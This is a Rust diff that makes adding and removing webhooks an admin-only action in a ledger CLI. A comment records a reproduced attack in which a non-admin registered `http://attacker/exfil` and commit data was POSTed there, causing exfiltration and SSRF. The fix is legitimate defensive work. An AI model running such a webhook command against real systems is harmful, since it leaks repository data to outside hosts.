@@ -473,10 +473,30 @@ fn requires_admin(cmd: &Commands) -> Option<&'static str> {
         // ones. Whether an arbitrary caller may append, and under which
         // principal, is a real question — and a different one. Folding it
         // into this change would decide it silently.
-        Commands::Ingest { .. }
-        | Commands::Webhook { .. }
-        | Commands::Watch { .. }
-        | Commands::Mcp => None,
+        // WEBHOOKS ARE EGRESS CONFIGURATION, NOT RECORDS. `add`/`rm` write
+        // `webhooks.json`, which later drives an outbound POST from the
+        // ledger host when `pre-deploy` fires. That is durable, it is
+        // consequential, and it appends nothing.
+        //
+        // REPRODUCED on an RBAC-armed ledger by a caller who is not an
+        // admin: `webhook add --provider generic --url http://attacker/exfil`
+        // succeeded, `pre-deploy` then POSTed commit authors, messages and
+        // SHAs to that URL, and `webhook rm` removed a legitimate admin's
+        // hook — exfiltration, arbitrary-URL SSRF from the ledger host, and
+        // silencing someone else's alerting, none of it needing the dev
+        // escape.
+        //
+        // This arm previously sat in the "appends NEW records" group, which
+        // is the lesson worth keeping: the match being EXHAUSTIVE guaranteed
+        // that a decision was made for every command, not that the decision
+        // was correct. Exhaustiveness catches the command nobody classified;
+        // it cannot catch the one classified wrongly.
+        Commands::Webhook { action } => match action {
+            WebhookAction::List => None,
+            WebhookAction::Add { .. } | WebhookAction::Rm { .. } => Some("webhook"),
+        },
+
+        Commands::Ingest { .. } | Commands::Watch { .. } | Commands::Mcp => None,
     }
 }
 
